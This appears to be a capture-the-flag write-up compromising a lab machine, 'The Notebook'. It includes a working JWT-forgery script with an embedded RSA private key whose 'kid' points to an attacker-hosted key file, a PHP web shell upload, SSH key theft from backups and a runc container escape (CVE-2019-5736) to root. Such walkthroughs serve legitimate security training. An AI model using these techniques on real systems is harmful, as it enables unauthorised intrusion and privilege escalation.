nmap result

```perl
nmap -sC -sV 10.10.10.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-20 10:08 EET
Nmap scan report for 10.10.10.230
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

port 80 website

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6e748bab-4537-4785-a920-7030733a9969/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6e748bab-4537-4785-a920-7030733a9969/Untitled.png)

gobuster result

```perl
gobuster dir -u http://10.10.10.230/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt
/admin (Status: 403)
/logout (Status: 302)
/login (Status: 200)
/register (Status: 200)
```

/admin 

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/adb79ca8-d3f9-495a-a478-419422d7b98b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/adb79ca8-d3f9-495a-a478-419422d7b98b/Untitled.png)

/register

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/609cef0d-59e4-473f-bb7d-a68cc3c9e57b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/609cef0d-59e4-473f-bb7d-a68cc3c9e57b/Untitled.png)

Looks like the website is using `JWT Token` .

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2ad02f3a-9661-4645-a6f3-e10b4de0a810/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2ad02f3a-9661-4645-a6f3-e10b4de0a810/Untitled.png)

If we decode the token we get:

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8e78f72f-284c-4358-b688-b1e97f50fc48/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8e78f72f-284c-4358-b688-b1e97f50fc48/Untitled.png)

It looks like it's using `privKey.key` from `[localhost](http://localhost)` to sign the `jwt token`.

Use the following script to generate a JWT Token:

```perl
import jwt
private_key = '''
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA31XPGTYFBqxdv/HwLx7BWU1+ER4AhoD2ohp/HhUPTPpIacs2
vHR7iFteGng6D4ic6NiIubldXMLG0T4j9mgw0Uf3TY3I85hcGflNh1eQeSFTEDME
bLxSDHdDazvkxHnM2V3V8TzZdvxf2bEDI0uVc37kZm5e17b+vL5jkhzHs9uiMkJB
XnFN71yZgMQDVx3C3bC4WkcHj4+jwqaWyxGwSbHkLMB/GCvvAWaEYUNexVAfahLb
kG4H1DP3Vzn9ZHOcJRv7kLlFbgznaf3xXLFGoi/2te4REJMnOPFWRtnthMtiPBsn
LAJHC6w8Rj5XbEsrSsN3ib9s6M2M3Bw7Qt/keQIDAQABAoIBAQCugjVNxMkOmtay
ahC8MPLxnbyZEXFlqBWPOtcDIX+QLa0xhUli3j28oXAZjMIJazz4MGI9hRrvpX6G
92BQZL9oeCxEHDreJLoqzYOH8qMAE0r9SG/3qvsNpI84llc+MtIfMtQ+KMbf03nt
9wO1q5S+53L+mtVfBy1rO/U/sV9WKB04efXuE/8SNcakObzAyxMJBs7lkG9Uf3vv
ZUcLQ6CCxayqGaaaJYn4CRZinGHXS6shUaIkKtlN9cVdYkiChReBZLIha5sDoH27
qWI6yjb+a41SB3cgv+l63fK5N5Qla9WTpFBzMGywYnp8n/AiSlqj6E4arez7mEAR
4T9gLCMVAoGBAPo0G1jLN2FeYtwawjuNHGeFS1B+ZR+yT+ynltXT/nlb1lUlxeRw
0fYh+yhypL2s1xEOR6a4CwWW3Qo3xMADZ8lRZfhftxTzmXULPzHUmIghIAWKspye
UgphYN9fxlz3O8MUW60Qo1dMcSmwydzp43PfL4uhPAiWzlIqQV57GSe3AoGBAOSC
WlPSMMjyUG9yeQ34FotAWeNa9+wg+6AD7z4Gg5S4fHF39R3Xd6BZtSTfkD6aweay
EyV/u32nY/ozJrleR1aENDZxHRUcqjhnjteWJucalSKMGzWyPi6Zm6ofcKQ4MjVI
EBUVCFejwn6TBfbU1pUUd+lQVHEa/tiU0s10unVPAoGASmdubnRYLrNj0LKAajcn
aD2CTRiZN9jN3cFkoIffV/WQgleuRqWqOniWeMvG48TfW+oUMqbuWCYp61z0PGmG
1p5HJZpJFojubJkAnO/swCahoCRDw0Ftgjq9FRAlLAY1lmiabpfRCyfnSw+QqApB
onaPbAVxldhK2LJKKC+RJncCgYEA37RZd5vblK3cXu6jYjCQ6WxrU2+4LNuxWtrf
OUqpQExHz9HPDpLlEv8fnmSbUx6wWwfURK7Cv2XDM6sl6u1IS4OLlgywmv2AC04e
giIGHdNhUvv0m2HPDFHnGepDnRFC3fSZgfogO6QfAUkv2pBNLo9mQOwabswt15wC
r47qB3MCgYEAs9zuhBDna1Lrfapshv6z8h4WleIVtqx4ghThobiaAULI1EexS/Os
lIfbMMQotwIsGnCBpD2EQ/riX7x+X321p5RiMSQys0Ih5tei3+ljAz0zFBcjCPSh
36ozc3Sn7wlaYbacBL02UlM9YwjDE8/VjulFH5qqNBvuEIwC/a+TEko=
-----END RSA PRIVATE KEY-----
'''

payload = {'username':'linked','email':'linked@linked.com','admin_cap':'True'}
token = jwt.encode(payload,private_key,algorithm='RS256',headers={'kid':'http://10.10.14.164/privKey.key'})
print(token)
```

Also, to generate a RSA private key I used the following command:

```perl
openssl genrsa -out private.pem 2048
```

Start a python server and rename the `RSA key` to `privKey.key`

We used the RSA key to sign the token.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3de26e25-31ec-4e8b-b281-22bd32e8ee3a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3de26e25-31ec-4e8b-b281-22bd32e8ee3a/Untitled.png)

Now we have admin privileges

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/24f26dfe-6e63-4922-a431-e75f68dbeccf/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/24f26dfe-6e63-4922-a431-e75f68dbeccf/Untitled.png)

Interesting note about PHP files, looks like they are executed.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/acd7dc2a-dcd5-4f85-84d7-8a9a45b07c61/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/acd7dc2a-dcd5-4f85-84d7-8a9a45b07c61/Untitled.png)

Upload a `php shell`.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f9c8792d-d387-41d5-8d8d-1f9c88822366/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f9c8792d-d387-41d5-8d8d-1f9c88822366/Untitled.png)

Looks like the shell.php got renamed.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7f55fbfc-d2ce-4735-8345-8e6630422641/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7f55fbfc-d2ce-4735-8345-8e6630422641/Untitled.png)

Shell as user `www-data`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f274e71a-1b43-4483-890b-a4e3ba8768dd/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f274e71a-1b43-4483-890b-a4e3ba8768dd/Untitled.png)

In `/var/backups` there is a `home.tar.gz` file.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3888729d-30e6-4069-a0e0-1e0426395080/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3888729d-30e6-4069-a0e0-1e0426395080/Untitled.png)

In there we can find the `id_rsa` key for user `noah`.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a8fa4389-809e-40c2-a986-a39e479a218a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a8fa4389-809e-40c2-a986-a39e479a218a/Untitled.png)

Shell as user `noah`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b4046b9a-c93f-428a-a5bf-6d1a12f08fd4/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b4046b9a-c93f-428a-a5bf-6d1a12f08fd4/Untitled.png)

Checking privileges

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/852e62bc-4a88-4d94-bd77-e5f551d778bb/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/852e62bc-4a88-4d94-bd77-e5f551d778bb/Untitled.png)

Using the following command we can access the docker as root

```perl
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
```

Searching for some exploit online i've found this one:

[https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)

This exploit requires that you have `root` access on the docker container.

First compile the `main.go` file using the command:

```perl
go build main.go
```

Send the compiled file to the docker container and execute it. Now wait for someone to connect to the docker container.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b24eaca1-ef39-421c-95b1-d44932bf0531/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b24eaca1-ef39-421c-95b1-d44932bf0531/Untitled.png)

Start a nc listener and from another bash session connect to the docker container using the `privileged command`. 

shell as `root`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f6195af9-da6f-46b4-99c3-376bce1ef85e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f6195af9-da6f-46b4-99c3-376bce1ef85e/Untitled.png)

**************************************************FLAGS************************************************

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1f9947bc-6a64-4902-bed6-acf6fb61ee19/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1f9947bc-6a64-4902-bed6-acf6fb61ee19/Untitled.png)
